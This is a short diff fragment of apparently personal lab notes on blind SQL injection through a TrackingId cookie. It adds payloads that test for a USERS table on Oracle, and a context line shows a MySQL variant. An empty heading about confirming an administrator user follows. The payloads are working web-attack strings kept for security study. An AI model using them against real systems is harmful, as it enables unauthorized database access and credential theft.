@@ -248,6 +248,11 @@ GIVEN : The database contains a different table called users, with columns calle
    TrackingId=xyz'||(SELECT '' )||'--          :MYSQL DB
 
 
+   -CONFIRM USER TABLE IS EXIST OR NOT
+    '||(SELECT '' FROM USERS)||'--+
+    '||(SELECT '' FROM USERS WHERE ROWNUM=1)||'  :ORACLE DB
 
 
+   -CONFIRM USER (administrator) TABLE IS EXIST OR NOT
+   
 
